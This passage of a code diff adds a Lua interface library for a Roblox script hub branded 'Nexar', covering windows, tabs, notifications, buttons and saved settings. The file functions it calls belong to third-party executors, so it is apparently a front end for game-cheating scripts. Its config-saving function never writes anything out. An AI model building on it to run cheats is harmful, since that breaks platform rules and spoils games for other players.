+Library.Elements[ElementName] = function(...)
+return ElementFunction(...)
+end
+end
+
+local function MakeElement(ElementName, ...)
+local NewElement = Library.Elements[ElementName](...)
+return NewElement
+end
+
+local function SetProps(Element, Props)
+table.foreach(Props, function(Property, Value)
+Element[Property] = Value
+end)
+return Element
+end
+
+local function SetChildren(Element, Children)
+table.foreach(Children, function(_, Child)
+Child.Parent = Element
+end)
+return Element
+end
+
+local function Round(Number, Factor)
+local Result = math.floor(Number/Factor + (math.sign(Number) * 0.5)) * Factor
+if Result < 0 then Result = Result + Factor end
+return Result
+end
+
+local function ReturnProperty(Object)
+if Object:IsA("Frame") or Object:IsA("TextButton") then
+return "BackgroundColor3"
+end
+if Object:IsA("ScrollingFrame") then
+return "ScrollBarImageColor3"
+end
+if Object:IsA("UIStroke") then
+return "Color"
+end
+if Object:IsA("TextLabel") or Object:IsA("TextBox") then
+return "TextColor3"
+end
+if Object:IsA("ImageLabel") or Object:IsA("ImageButton") then
+return "ImageColor3"
+end
+end
+
+local function AddThemeObject(Object, Type)
+if not Library.ThemeObjects[Type] then
+Library.ThemeObjects[Type] = {}
+end
+table.insert(Library.ThemeObjects[Type], Object)
+Object[ReturnProperty(Object)] = Library.Themes[Library.SelectedTheme][Type]
+return Object
+end
+
+local function SetTheme()
+for Name, Type in pairs(Library.ThemeObjects) do
+for _, Object in pairs(Type) do
+Object[ReturnProperty(Object)] = Library.Themes[Library.SelectedTheme][Name]
+end
+end
+end
+
+local function PackColor(Color)
+return {R = Color.R * 255, G = Color.G * 255, B = Color.B * 255}
+end
+
+local function UnpackColor(Color)
+return Color3.fromRGB(Color.R, Color.G, Color.B)
+end
+
+local function LoadCfg(Config)
+local Data = HttpService:JSONDecode(Config)
+table.foreach(Data, function(a,b)
+if Library.Flags[a] then
+spawn(function()
+if Library.Flags[a].Type == "Colorpicker" then
+Library.Flags[a]:Set(UnpackColor(b))
+else
+Library.Flags[a]:Set(b)
+end
+end)
+else
+warn("Clean UI Library Config Loader - Could not find ", a ,b)
+end
+end)
+end
+
+local function SaveCfg(Name)
+local Data = {}
+for i,v in pairs(Library.Flags) do
+if v.Save then
+if v.Type == "Colorpicker" then
+Data[i] = PackColor(v.Value)
+else
+Data[i] = v.Value
+end
+end
+end
+end
+
+local WhitelistedMouse = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2,Enum.UserInputType.MouseButton3,Enum.UserInputType.Touch}
+local BlacklistedKeys = {Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Up,Enum.KeyCode.Left,Enum.KeyCode.Down,Enum.KeyCode.Right,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Backspace,Enum.KeyCode.Escape}
+
+local function CheckKey(Table, Key)
+for _, v in next, Table do
+if v == Key then
+return true
+end
+end
+end
+
+CreateElement("Corner", function(Scale, Offset)
+local Corner = Create("UICorner", {
+CornerRadius = UDim.new(Scale or 0, Offset or 10)
+})
+return Corner
+end)
+
+CreateElement("Stroke", function(Color, Thickness)
+local Stroke = Create("UIStroke", {
+Color = Color or Color3.fromRGB(255, 255, 255),
+Thickness = Thickness or 1
+})
+return Stroke
+end)
+
+CreateElement("List", function(Scale, Offset)
+local List = Create("UIListLayout", {
+SortOrder = Enum.SortOrder.LayoutOrder,
+Padding = UDim.new(Scale or 0, Offset or 0)
+})
+return List
+end)
+
+CreateElement("Padding", function(Bottom, Left, Right, Top)
+local Padding = Create("UIPadding", {
+PaddingBottom = UDim.new(0, Bottom or 4),
+PaddingLeft = UDim.new(0, Left or 4),
+PaddingRight = UDim.new(0, Right or 4),
+PaddingTop = UDim.new(0, Top or 4)
+})
+return Padding
+end)
+
+CreateElement("TFrame", function()
+local TFrame = Create("Frame", {
+BackgroundTransparency = 1
+})
+return TFrame
+end)
+
+CreateElement("Frame", function(Color)
+local Frame = Create("Frame", {
+BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
+BorderSizePixel = 0
+})
+return Frame
+end)
+
+CreateElement("RoundFrame", function(Color, Scale, Offset)
+local Frame = Create("Frame", {
+BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
+BorderSizePixel = 0
+}, {
+Create("UICorner", {
+CornerRadius = UDim.new(Scale, Offset)
+})
+})
+return Frame
+end)
+
+CreateElement("Button", function()
+local Button = Create("TextButton", {
+Text = "",
+AutoButtonColor = false,
+BackgroundTransparency = 1,
+BorderSizePixel = 0
+})
+return Button
+end)
+
+CreateElement("ScrollFrame", function(Color, Width)
+local ScrollFrame = Create("ScrollingFrame", {
+BackgroundTransparency = 1,
+MidImage = "rbxassetid://7445543667",
+BottomImage = "rbxassetid://7445543667",
+TopImage = "rbxassetid://7445543667",
+ScrollBarImageColor3 = Color,
+BorderSizePixel = 0,
+ScrollBarThickness = Width,
+CanvasSize = UDim2.new(0, 0, 0, 0)
+})
+return ScrollFrame
+end)
+
+CreateElement("Image", function(ImageID)
+local ImageNew = Create("ImageLabel", {
+Image = ImageID,
+BackgroundTransparency = 1
+})
+
+
+if GetIcon(ImageID) ~= nil then
+	ImageNew.Image = GetIcon(ImageID)
+end	
+
+return ImageNew
+end)
+
+CreateElement("ImageButton", function(ImageID)
+local Image = Create("ImageButton", {
+Image = ImageID,
+BackgroundTransparency = 1
+})
+return Image
+end)
+
+CreateElement("Label", function(Text, TextSize, Transparency)
+local Label = Create("TextLabel", {
+Text = Text or "",
+TextColor3 = Color3.fromRGB(240, 240, 240),
+TextTransparency = Transparency or 0,
+TextSize = TextSize or 15,
+Font = Enum.Font.GothamSemibold,
+RichText = true,
+BackgroundTransparency = 1,
+TextXAlignment = Enum.TextXAlignment.Left
+})
+return Label
+end)
+
+local NotificationHolder = SetProps(SetChildren(MakeElement("TFrame"), {
+SetProps(MakeElement("List"), {
+HorizontalAlignment = Enum.HorizontalAlignment.Center,
+SortOrder = Enum.SortOrder.LayoutOrder,
+VerticalAlignment = Enum.VerticalAlignment.Bottom,
+Padding = UDim.new(0, 5)
+})
+}), {
+Position = UDim2.new(1, -25, 1, -25),
+Size = UDim2.new(0, 300, 1, -25),
+AnchorPoint = Vector2.new(1, 1),
+Parent = Container
+})
+
+function Library:MakeNotification(NotificationConfig)
+spawn(function()
+NotificationConfig.Name = NotificationConfig.Name or "Notification"
+NotificationConfig.Content = NotificationConfig.Content or "Test"
+NotificationConfig.Image = NotificationConfig.Image or "rbxassetid://4384403532"
+NotificationConfig.Time = NotificationConfig.Time or 15
+
+
+	local NotificationParent = SetProps(MakeElement("TFrame"), {
+		Size = UDim2.new(1, 0, 0, 0),
+		AutomaticSize = Enum.AutomaticSize.Y,
+		Parent = NotificationHolder
+	})
+
+	local NotificationFrame = SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(25, 25, 25), 0, 10), {
+		Parent = NotificationParent, 
+		Size = UDim2.new(1, 0, 0, 0),
+		Position = UDim2.new(1, -55, 0, 0),
+		BackgroundTransparency = 0,
+		AutomaticSize = Enum.AutomaticSize.Y
+	}), {
+		MakeElement("Stroke", Color3.fromRGB(93, 93, 93), 1.2),
+		MakeElement("Padding", 12, 12, 12, 12),
+		SetProps(MakeElement("Image", NotificationConfig.Image), {
+			Size = UDim2.new(0, 20, 0, 20),
+			ImageColor3 = Color3.fromRGB(240, 240, 240),
+			Name = "Icon"
+		}),
+		SetProps(MakeElement("Label", NotificationConfig.Name, 15), {
+			Size = UDim2.new(1, -30, 0, 20),
+			Position = UDim2.new(0, 30, 0, 0),
+			Font = Enum.Font.FredokaOne,
+			Name = "Title"
+		}),
+		SetProps(MakeElement("Label", NotificationConfig.Content, 14), {
+			Size = UDim2.new(1, 0, 0, 0),
+			Position = UDim2.new(0, 0, 0, 25),
+			Font = Enum.Font.FredokaOne,
+			Name = "Content",
+			AutomaticSize = Enum.AutomaticSize.Y,
+			TextColor3 = Color3.fromRGB(200, 200, 200),
+			TextWrapped = true
+		})
+	})
+	TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 0, 0, 0)}):Play()
+	wait(NotificationConfig.Time - 0.88)
+	TweenService:Create(NotificationFrame.Icon, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
+	TweenService:Create(NotificationFrame, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.6}):Play()
+	wait(0.3)
+	TweenService:Create(NotificationFrame.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0.9}):Play()
+	TweenService:Create(NotificationFrame.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.4}):Play()
+	TweenService:Create(NotificationFrame.Content, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.5}):Play()
+	wait(0.05)
+	NotificationFrame:TweenPosition(UDim2.new(1, 20, 0, 0),'In','Quint',0.8,true)
+	wait(1.35)
+	NotificationFrame:Destroy()
+end)
+end
+
+function Library:Init()
+if Library.SaveCfg then
+pcall(function()
+if isfile(Library.Folder .. "/" .. game.GameId .. ".txt") then
+LoadCfg(readfile(Library.Folder .. "/" .. game.GameId .. ".txt"))
+Library:MakeNotification({
+Name = "Configuration",
+Content = "Auto-loaded configuration for the game " .. game.GameId .. ".",
+Time = 5
+})
+end
+end)
+end
+end
+
+function Library:MakeWindow(WindowConfig)
+local FirstTab = true
+local Minimized = false
+local Loaded = false
+local UIHidden = false
+
+
+WindowConfig = WindowConfig or {}
+WindowConfig.Name = WindowConfig.Name or "BadBull"
+WindowConfig.ConfigFolder = WindowConfig.ConfigFolder or WindowConfig.Name
+WindowConfig.SaveConfig = WindowConfig.SaveConfig or false
+WindowConfig.HidePremium = WindowConfig.HidePremium or false
+if WindowConfig.IntroEnabled == nil then
+	WindowConfig.IntroEnabled = true
+end
+WindowConfig.IntroToggleIcon = WindowConfig.IntroToggleIcon or "rbxassetid://8834748103"
+WindowConfig.IntroText = WindowConfig.IntroText or "Starting Nexar Script.."
+WindowConfig.CloseCallback = WindowConfig.CloseCallback or function() end
+WindowConfig.ShowIcon = WindowConfig.ShowIcon or false
+WindowConfig.Icon = WindowConfig.Icon or "rbxassetid://8834748103"
+WindowConfig.IntroIcon = WindowConfig.IntroIcon or "rbxassetid://8834748103"
+Library.Folder = WindowConfig.ConfigFolder
+Library.SaveCfg = WindowConfig.SaveConfig
+
+if WindowConfig.SaveConfig then
+	if not isfolder(WindowConfig.ConfigFolder) then
+		makefolder(WindowConfig.ConfigFolder)
+	end	
+end
+
+local TabHolder = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 4), {
+	Size = UDim2.new(1, 0, 1, -50)
+}), {
+	MakeElement("List"),
+	MakeElement("Padding", 8, 0, 0, 8)
+}), "Divider")
+
+AddConnection(TabHolder.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+	TabHolder.CanvasSize = UDim2.new(0, 0, 0, TabHolder.UIListLayout.AbsoluteContentSize.Y + 16)
+end)
+
+local CloseBtn = SetChildren(SetProps(MakeElement("Button"), {
+	Size = UDim2.new(0.5, 0, 1, 0),
+	Position = UDim2.new(0.5, 0, 0, 0),
+	BackgroundTransparency = 1
+}), {
+	AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072725342"), {
+		Position = UDim2.new(0, 9, 0, 6),
+		Size = UDim2.new(0, 18, 0, 18)
+	}), "Text")
+})
+
+local MinimizeBtn = SetChildren(SetProps(MakeElement("Button"), {
+	Size = UDim2.new(0.5, 0, 1, 0),
+	BackgroundTransparency = 1
+}), {
+	AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072719338"), {
+		Position = UDim2.new(0, 9, 0, 6),
+		Size = UDim2.new(0, 18, 0, 18),
+		Name = "Ico"
+	}), "Text")
+})
+
+local DragPoint = SetProps(MakeElement("TFrame"), {
+	Size = UDim2.new(1, 0, 0, 50)
+})
+
+local WindowStuff = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 10), {
+	Size = UDim2.new(0, 150, 1, -50),
+	Position = UDim2.new(0, 0, 0, 50)
+}), {
+	AddThemeObject(SetProps(MakeElement("Frame"), {
+		Size = UDim2.new(1, 0, 0, 10),
+		Position = UDim2.new(0, 0, 0, 0)
+	}), "Second"), 
+	AddThemeObject(SetProps(MakeElement("Frame"), {
+		Size = UDim2.new(0, 10, 1, 0),
+		Position = UDim2.new(1, -10, 0, 0)
+	}), "Second"), 
+	AddThemeObject(SetProps(MakeElement("Frame"), {
+		Size = UDim2.new(0, 1, 1, 0),
+		Position = UDim2.new(1, -1, 0, 0)
+	}), "Stroke"), 
+	TabHolder,
+	SetChildren(SetProps(MakeElement("TFrame"), {
+		Size = UDim2.new(1, 0, 0, 50),
+		Position = UDim2.new(0, 0, 1, -50)
+	}), {
+		AddThemeObject(SetProps(MakeElement("Frame"), {
+			Size = UDim2.new(1, 0, 0, 1)
+		}), "Stroke"), 
+		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
+			AnchorPoint = Vector2.new(0, 0.5),
+			Size = UDim2.new(0, 32, 0, 32),
+			Position = UDim2.new(0, 10, 0.5, 0)
+		}), {
+			SetProps(MakeElement("Image", "https://www.roblox.com/headshot-thumbnail/image?userId=".. LocalPlayer.UserId .."&width=420&height=420&format=png"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			}),
+			AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://4031889928"), {
+				Size = UDim2.new(1, 0, 1, 0),
+			}), "Second"),
+			MakeElement("Corner", 1)
+		}), "Divider"),
+		SetChildren(SetProps(MakeElement("TFrame"), {
+			AnchorPoint = Vector2.new(0, 0.5),
+			Size = UDim2.new(0, 32, 0, 32),
+			Position = UDim2.new(0, 10, 0.5, 0)
+		}), {
+			AddThemeObject(MakeElement("Stroke"), "Stroke"),
+			MakeElement("Corner", 1)
+		}),
+		AddThemeObject(SetProps(MakeElement("Label", "Nexar", WindowConfig.HidePremium and 14 or 13), {
+			Size = UDim2.new(1, -60, 0, 13),
+			Position = WindowConfig.HidePremium and UDim2.new(0, 50, 0, 19) or UDim2.new(0, 50, 0, 12),
+			Font = Enum.Font.FredokaOne,
+			ClipsDescendants = true
+		}), "Text"),
+		AddThemeObject(SetProps(MakeElement("Label", "Future of Scripts", 12), {
+			Size = UDim2.new(1, -60, 0, 12),
+			Position = UDim2.new(0, 50, 1, -25),
+			Visible = not WindowConfig.HidePremium
+		}), "TextDark")
+	}),
+}), "Second")
+
+local WindowName = AddThemeObject(SetProps(MakeElement("Label", WindowConfig.Name, 14), {
+	Size = UDim2.new(1, -30, 2, 0),
+	Position = UDim2.new(0, 25, 0, -24),
+	Font = Enum.Font.GothamBlack,
+	TextSize = 20
+}), "Text")
+
+local WindowTopBarLine = AddThemeObject(SetProps(MakeElement("Frame"), {
+	Size = UDim2.new(1, 0, 0, 1),
+	Position = UDim2.new(0, 0, 1, -1)
+}), "Stroke")
+
+local MainWindow = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 10), {
+	Parent = Container,
+	Position = UDim2.new(0.5, -307, 0.5, -172),
+	Size = UDim2.new(0, 615, 0, 344),
+	ClipsDescendants = true
+}), {
+	SetChildren(SetProps(MakeElement("TFrame"), {
+		Size = UDim2.new(1, 0, 0, 50),
+		Name = "TopBar"
+	}), {
+		WindowName,
+		WindowTopBarLine,
+		AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 7), {
+			Size = UDim2.new(0, 70, 0, 30),
+			Position = UDim2.new(1, -90, 0, 10)
+		}), {
+			AddThemeObject(MakeElement("Stroke"), "Stroke"),
+			AddThemeObject(SetProps(MakeElement("Frame"), {
+				Size = UDim2.new(0, 1, 1, 0),
+				Position = UDim2.new(0.5, 0, 0, 0)
+			}), "Stroke"), 
+			CloseBtn,
+			MinimizeBtn
+		}), "Second"), 
+	}),
+	DragPoint,
+	WindowStuff
+}), "Main")
+
+if WindowConfig.ShowIcon then
+	WindowName.Position = UDim2.new(0, 50, 0, -24)
+	local WindowIcon = SetProps(MakeElement("Image", WindowConfig.Icon), {
+		Size = UDim2.new(0, 20, 0, 20),
+		Position = UDim2.new(0, 25, 0, 15)
+	})
+	WindowIcon.Parent = MainWindow.TopBar
+end	
+
+MakeDraggable(DragPoint, MainWindow)
+
+local MobileReopenButton = SetChildren(SetProps(MakeElement("Button"), {
+	Parent = Container,
+	Size = UDim2.new(0, 40, 0, 40),
+	Position = UDim2.new(0.5, -20, 0, 20),
+	BackgroundTransparency = 0,
+	BackgroundColor3 = Library.Themes[Library.SelectedTheme].Main,
+	Visible = false
+}), {
+	AddThemeObject(SetProps(MakeElement("Image", WindowConfig.IntroToggleIcon or "http://www.roblox.com/asset/?id=8834748103"), {
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = UDim2.new(0.5, 0, 0.5, 0),
+		Size = UDim2.new(0.7, 0, 0.7, 0),
+	}), "Text"),
+	MakeElement("Corner", 1)
+})
+
+AddConnection(CloseBtn.MouseButton1Up, function()
+	MainWindow.Visible = false
+	if UserInputService.TouchEnabled then
+		MobileReopenButton.Visible = true
+	end
+	UIHidden = true
+	Library:MakeNotification({
+		Name = "Interface Hidden",
+		Content = UserInputService.TouchEnabled and "Tap the button or Left Control to reopen the interface" or "Press Left Control to reopen the interface",
+		Time = 5
+	})
+	WindowConfig.CloseCallback()
+end)
+
+AddConnection(UserInputService.InputBegan, function(Input)
+	if Input.KeyCode == Enum.KeyCode.LeftControl and UIHidden == true then
+		MainWindow.Visible = true
+		MobileReopenButton.Visible = false
+	end
+end)
+
+AddConnection(MobileReopenButton.Activated, function()
+	MainWindow.Visible = true
+	MobileReopenButton.Visible = false
+end)
+
+AddConnection(MinimizeBtn.MouseButton1Up, function()
+	if Minimized then
+		TweenService:Create(MainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 615, 0, 344)}):Play()
+		MinimizeBtn.Ico.Image = "rbxassetid://7072719338"
+		wait(.02)
+		MainWindow.ClipsDescendants = false
+		WindowStuff.Visible = true
+		WindowTopBarLine.Visible = true
+	else
+		MainWindow.ClipsDescendants = true
+		WindowTopBarLine.Visible = false
+		MinimizeBtn.Ico.Image = "rbxassetid://7072720870"
+
+		TweenService:Create(MainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, WindowName.TextBounds.X + 140, 0, 50)}):Play()
+		wait(0.1)
+		WindowStuff.Visible = false	
+	end
+	Minimized = not Minimized    
+end)
+
+local function LoadSequence()
+	MainWindow.Visible = false
+	local LoadSequenceLogo = SetProps(MakeElement("Image", WindowConfig.IntroIcon), {
+		Parent = Container,
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = UDim2.new(0.5, 0, 0.4, 0),
+		Size = UDim2.new(0, 28, 0, 28),
+		ImageColor3 = Color3.fromRGB(255, 255, 255),
+		ImageTransparency = 1
+	})
+
+	local LoadSequenceText = SetProps(MakeElement("Label", WindowConfig.IntroText, 14), {
+		Parent = Container,
+		Size = UDim2.new(1, 0, 1, 0),
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = UDim2.new(0.5, 19, 0.5, 0),
+		TextXAlignment = Enum.TextXAlignment.Center,
+		Font = Enum.Font.GothamBold,
+		TextTransparency = 1
+	})
+
+	TweenService:Create(LoadSequenceLogo, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0, Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
+	wait(0.8)
+	TweenService:Create(LoadSequenceLogo, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -(LoadSequenceText.TextBounds.X/2), 0.5, 0)}):Play()
+	wait(0.3)
+	TweenService:Create(LoadSequenceText, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
+	wait(2)
+	TweenService:Create(LoadSequenceText, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
+	MainWindow.Visible = true
+	LoadSequenceLogo:Destroy()
+	LoadSequenceText:Destroy()
+end 
+
+if WindowConfig.IntroEnabled then
+	LoadSequence()
+end	
+
+local TabFunction = {}
+function TabFunction:MakeTab(TabConfig)
+	TabConfig = TabConfig or {}
+	TabConfig.Name = TabConfig.Name or "Tab"
+	TabConfig.Icon = TabConfig.Icon or ""
+	TabConfig.PremiumOnly = TabConfig.PremiumOnly or false
+
+	local TabFrame = SetChildren(SetProps(MakeElement("Button"), {
+		Size = UDim2.new(1, 0, 0, 30),
+		Parent = TabHolder
+	}), {
+		AddThemeObject(SetProps(MakeElement("Image", TabConfig.Icon), {
+			AnchorPoint = Vector2.new(0, 0.5),
+			Size = UDim2.new(0, 18, 0, 18),
+			Position = UDim2.new(0, 10, 0.5, 0),
+			ImageTransparency = 0.4,
+			Name = "Ico"
+		}), "Text"),
+		AddThemeObject(SetProps(MakeElement("Label", TabConfig.Name, 14), {
+			Size = UDim2.new(1, -35, 1, 0),
+			Position = UDim2.new(0, 35, 0, 0),
+			Font = Enum.Font.GothamBlack,
+			TextTransparency = 0.4,
+			Name = "Title"
+		}), "Text")
+	})
+
+	if GetIcon(TabConfig.Icon) ~= nil then
+		TabFrame.Ico.Image = GetIcon(TabConfig.Icon)
+	end	
+
+	local Container = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 5), {
+		Size = UDim2.new(1, -150, 1, -50),
+		Position = UDim2.new(0, 150, 0, 50),
+		Parent = MainWindow,
+		Visible = false,
+		Name = "ItemContainer"
+	}), {
+		MakeElement("List", 0, 6),
+		MakeElement("Padding", 15, 10, 10, 15)
+	}), "Divider")
+
+	AddConnection(Container.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+		Container.CanvasSize = UDim2.new(0, 0, 0, Container.UIListLayout.AbsoluteContentSize.Y + 30)
+	end)
+
+	if FirstTab then
+		FirstTab = false
+		TabFrame.Ico.ImageTransparency = 0
+		TabFrame.Title.TextTransparency = 0
+		TabFrame.Title.Font = Enum.Font.GothamBlack
+		Container.Visible = true
+	end    
+
+	AddConnection(TabFrame.MouseButton1Click, function()
+		for _, Tab in next, TabHolder:GetChildren() do
+			if Tab:IsA("TextButton") then
+				Tab.Title.Font = Enum.Font.GothamBlack
+TweenService:Create(Tab.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0.4, ImageColor3 = Color3.fromRGB(240, 240, 240)}):Play()
+TweenService:Create(Tab.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0.4, TextColor3 = Color3.fromRGB(240, 240, 240)}):Play()
+end
+end
+for _, ItemContainer in next, MainWindow:GetChildren() do
+if ItemContainer.Name == "ItemContainer" then
+ItemContainer.Visible = false
+end
+end
+TweenService:Create(TabFrame.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0, ImageColor3 = Color3.fromRGB(238, 220, 149)}):Play()
+TweenService:Create(TabFrame.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0, TextColor3 = Color3.fromRGB(238, 220, 149)}):Play()
+TabFrame.Title.Font = Enum.Font.GothamBlack
+Container.Visible = true
+end)
+
+
+	local function GetElements(ItemParent)
+		local ElementFunction = {}
+		function ElementFunction:AddLabel(Text)
+			local LabelFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 30),
+				BackgroundTransparency = 0.7,
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", Text, 15), {
+					Size = UDim2.new(1, -12, 1, 0),
+					Position = UDim2.new(0, 12, 0, 0),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content"
+				}), "Text"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke")
+			}), "Second")
+
+			local LabelFunction = {}
+			function LabelFunction:Set(ToChange)
+				LabelFrame.Content.Text = ToChange
+			end
+			return LabelFunction
+		end
+		function ElementFunction:AddParagraph(Text, Content)
+			Text = Text or "Text"
+			Content = Content or "Content"
+
+			local ParagraphFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 30),
+				BackgroundTransparency = 0.7,
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", Text, 15), {
+					Size = UDim2.new(1, -12, 0, 14),
+					Position = UDim2.new(0, 12, 0, 10),
+					Font = Enum.Font.FredokaOne,
+					Name = "Title"
+				}), "Text"),
+				AddThemeObject(SetProps(MakeElement("Label", "", 13), {
+					Size = UDim2.new(1, -24, 0, 0),
+					Position = UDim2.new(0, 12, 0, 26),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content",
+					TextWrapped = true
+				}), "TextDark"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke")
+			}), "Second")
+
+			AddConnection(ParagraphFrame.Content:GetPropertyChangedSignal("Text"), function()
+				ParagraphFrame.Content.Size = UDim2.new(1, -24, 0, ParagraphFrame.Content.TextBounds.Y)
+				ParagraphFrame.Size = UDim2.new(1, 0, 0, ParagraphFrame.Content.TextBounds.Y + 35)
+			end)
+
+			ParagraphFrame.Content.Text = Content
+
+			local ParagraphFunction = {}
+			function ParagraphFunction:Set(ToChange)
+				ParagraphFrame.Content.Text = ToChange
+			end
+			return ParagraphFunction
+		end    
+		function ElementFunction:AddButton(ButtonConfig)
+			ButtonConfig = ButtonConfig or {}
+			ButtonConfig.Name = ButtonConfig.Name or "Button"
+			ButtonConfig.Callback = ButtonConfig.Callback or function() end
+			ButtonConfig.Icon = ButtonConfig.Icon or "rbxassetid://3944703587"
+
+			local Button = {}
+
+			local Click = SetProps(MakeElement("Button"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			})
+
+			local ButtonFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 33),
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", ButtonConfig.Name, 15), {
+					Size = UDim2.new(1, -12, 1, 0),
+					Position = UDim2.new(0, 12, 0, 0),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content"
+				}), "Text"),
+				AddThemeObject(SetProps(MakeElement("Image", ButtonConfig.Icon), {
+					Size = UDim2.new(0, 20, 0, 20),
+					Position = UDim2.new(1, -30, 0, 7),
+				}), "TextDark"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				Click
+			}), "Second")
+
+			AddConnection(Click.MouseEnter, function()
+				TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+			end)
+
+			AddConnection(Click.MouseLeave, function()
+				TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Library.Themes[Library.SelectedTheme].Second}):Play()
+			end)
+
+			AddConnection(Click.MouseButton1Up, function()
+				TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+				spawn(function()
+					ButtonConfig.Callback()
+				end)
+			end)
+
+			AddConnection(Click.MouseButton1Down, function()
+				TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 6, Library.Themes[Library.SelectedTheme].Second.G * 255 + 6, Library.Themes[Library.SelectedTheme].Second.B * 255 + 6)}):Play()
+			end)
+
+			function Button:Set(ButtonText)
+				ButtonFrame.Content.Text = ButtonText
+			end	
+
+			return Button
+		end    
+		function ElementFunction:AddToggle(ToggleConfig)
+			ToggleConfig = ToggleConfig or {}
+			ToggleConfig.Name = ToggleConfig.Name or "Toggle"
+			ToggleConfig.Default = ToggleConfig.Default or false
+			ToggleConfig.Callback = ToggleConfig.Callback or function() end
+			ToggleConfig.Color = ToggleConfig.Color or Color3.fromRGB(238, 220, 149)
+			ToggleConfig.Flag = ToggleConfig.Flag or nil
+			ToggleConfig.Save = ToggleConfig.Save or false
+
+			local Toggle = {Value = ToggleConfig.Default, Save = ToggleConfig.Save}
+
+			local Click = SetProps(MakeElement("Button"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			})
+
+			local ToggleBox = SetChildren(SetProps(MakeElement("RoundFrame", ToggleConfig.Color, 0, 4), {
+				Size = UDim2.new(0, 24, 0, 24),
+				Position = UDim2.new(1, -24, 0.5, 0),
